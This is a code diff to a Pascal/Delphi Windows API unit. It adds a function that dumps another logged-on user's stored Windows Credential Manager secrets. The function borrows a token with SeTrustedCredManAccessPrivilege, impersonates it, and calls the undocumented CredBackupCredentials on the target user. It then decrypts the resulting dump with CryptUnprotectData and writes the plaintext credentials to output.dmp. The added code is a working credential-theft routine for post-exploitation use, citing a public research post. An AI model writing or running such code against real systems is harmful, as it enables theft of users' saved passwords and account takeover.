@@ -6,7 +6,7 @@ unit uadvapi32;
 interface
 
 uses
-  Classes, SysUtils,windows;
+  Classes, SysUtils,windows,utils,jwawincrypt;
 
 const
   LOGON_WITH_PROFILE = $00000001;
@@ -42,7 +42,7 @@ function enumprivileges:boolean;
 function ImpersonateUser(const User, PW: string): Boolean;
 function GetCurrUserName: string;
 
-
+function CredBackupCredentials_(pid:dword;userpid:dword):boolean;
 
 function ImpersonateAsSystemW_Vista(IntegrityLevel: TIntegrityLevel;pid:cardinal): Boolean;
 
@@ -77,6 +77,12 @@ function CreateProcessWithLogonW(
   lpStartupInfo: PStartupInfoW;
   lpProcessInformation: PProcessInformation
 ): BOOL; stdcall; external 'advapi32.dll';
+
+function CredBackupCredentials(Token:handle;
+                                   Path:LPCWSTR;
+                                   Password:PVOID;
+                                   PasswordSize:DWORD;
+                                   Flags:DWORD):BOOL; stdcall; external 'advapi32.dll';
 
 
 type
@@ -146,6 +152,8 @@ function CreateProcessWithTokenW(hToken: THandle;
   lpStartupInfo: PStartupInfoW;
   lpProcessInformation: PProcessInformation): BOOL; stdcall;external 'advapi32.dll';
   }
+
+  function RevertToSelf: BOOL; stdcall;external 'advapi32.dll';
 
 function DuplicateTokenEx(hExistingToken: HANDLE; dwDesiredAccess: DWORD;
   lpTokenAttributes: LPSECURITY_ATTRIBUTES; ImpersonationLevel: SECURITY_IMPERSONATION_LEVEL;
@@ -630,6 +638,125 @@ for i:=4 downto 0 do
   begin
   if ImpersonateAsSystemW_Vista (TIntegrityLevel(i),pid) then begin result:=true;exit;end;
   end;
+end;
+
+//https://www.tiraniddo.dev/2021/05/dumping-stored-credentials-with.html
+function CredBackupCredentials_(pid:dword;userpid:dword):boolean;
+type
+  //{$align 8}
+  _MY_BLOB = record
+    cbData: DWORD;
+    pbData: LPBYTE;
+  end;
+const
+  PROCESS_QUERY_LIMITED_INFORMATION: DWORD = 4096;
+var
+  //pid:dword;
+  creds,verify:_MY_BLOB;
+  dwFileSize,dwread,dwWrite:dword;
+  status:bool;
+  hproc:tHANDLE=thandle(-1);
+  htoken:tHANDLE=thandle(-1);
+  impToken :tHANDLE=thandle(-1);
+  userProc :tHANDLE=thandle(-1);
+  userToken:tHANDLE=thandle(-1);
+  hFile:tHANDLE=thandle(-1);
+  hwFile:tHANDLE=thandle(-1);
+  tp,prev:TTokenPrivileges; //Windows.TOKEN_PRIVILEGES;
+  luid:TLargeInteger; //Windows.LUID;
+  returnedlength:dword;
+  backupFile :pointer=nil;
+  currentdir:string;
+begin
+  result:=false;
+  currentdir :=GetCurrentDir;
+  log('OpenProcess '+inttostr(pid));
+  hProc:= OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION,FALSE,PID);
+  if hproc=thandle(-1) then exit;
+
+  log('OpenProcessToken...');
+  status:= OpenProcessToken(hProc,TOKEN_DUPLICATE,hToken);
+  if status=false then exit;
+
+  log('DuplicateTokenEx...');
+  status:= DuplicateTokenEx(hToken,TOKEN_ALL_ACCESS,nil,SecurityImpersonation,TokenPrimary,impToken);
+  if status=false then exit;
+
+  //TOKEN_PRIVILEGES tp ={0};
+  //LUID luid = {0};
+  log('LookupPrivilegeValueA...');
+  status:=LookupPrivilegeValueA(nil,'SeTrustedCredManAccessPrivilege',luid);
+  if status=false then exit;
+
+  tp.PrivilegeCount := 1;
+  tp.Privileges[0].Luid := luid;
+  tp.Privileges[0].Attributes := SE_PRIVILEGE_ENABLED;
+  log('AdjustTokenPrivileges...');
+  status:= AdjustTokenPrivileges(impToken,FALSE,tp,sizeof(TOKEN_PRIVILEGES),prev,returnedlength);
+  if status=false then exit;
+
+  log('OpenProcess '+inttostr(userpid));
+  userProc := OpenProcess(PROCESS_ALL_ACCESS,FALSE,userpid);
+  if userProc=thandle(-1) then exit;
+
+  log('OpenProcessToken...');
+  status := OpenProcessToken(userProc,TOKEN_ALL_ACCESS,userToken);
+  if status=false then exit;
+
+  log('ImpersonateLoggedOnUser...');
+  status := ImpersonateLoggedOnUser(impToken);
+  if status=false then exit;
+
+  log('CredBackupCredentials...');
+  status := CredBackupCredentials(userToken,lpcwstr('c:\temp\cred.dmp'),nil,0,0);
+  if status=false then exit;
+
+  log('CreateFile...');
+  hFile := CreateFile(pchar('c:\temp\cred.dmp'),GENERIC_READ,0,nil,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
+  if hFile=thandle(-1) then exit;
+
+  log('GetFileSize...');
+  dwFileSize := GetFileSize(hFile,nil);
+  if dwFileSize = INVALID_FILE_SIZE then exit;
+
+  log('ReadFile...'+inttostr(dwFileSize));
+  backupFile := AllocMem(dwFileSize);
+  dwRead := 0;
+  ReadFile(hFile,backupFile^,dwFileSize,dwRead,nil);
+  if dwread=0 then exit;
+
+  log('CryptUnprotectData...');
+  //DATA_BLOB creds = {0};
+  creds.cbData := dwFileSize;
+  creds.pbData := backupFile;
+  //DATA_BLOB verify ={0};
+  status := CryptUnprotectData(@creds,nil,nil,nil,nil,0,@verify);
+  if status=false then begin log(getlasterror);exit;end;;
+
+  log('RevertToSelf...');
+  status:=RevertToSelf;
+
+  log('CreateFile...');
+  dwWrite:=0;
+  hwFile := CreateFile(pchar(currentdir+'\ouput.dmp'),GENERIC_WRITE,0,nil,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,0);
+
+  log('WriteFile...'+inttostr(verify.cbData));
+  WriteFile(hwFile,verify.pbData^,verify.cbData,dwWrite,nil);
+  if dwWrite=0 then exit;
+
+  log('Cleaning...');
+  if hproc<>thandle(-1) then CloseHandle(hProc);
+  if hToken<>thandle(-1) then CloseHandle(hToken);
+  if impToken<>thandle(-1) then CloseHandle(impToken);
+  if userProc<>thandle(-1) then CloseHandle(userProc);
+  if userToken<>thandle(-1) then CloseHandle(userToken);
+  if hFile<>thandle(-1) then CloseHandle(hFile);
+  if backupFile <>nil then freemem(backupFile );
+  if hwFile<>thandle(-1) then CloseHandle(hwFile);
+
+  log('check output.dmp',1);
+
+  result:=true;
 end;
 
 end.
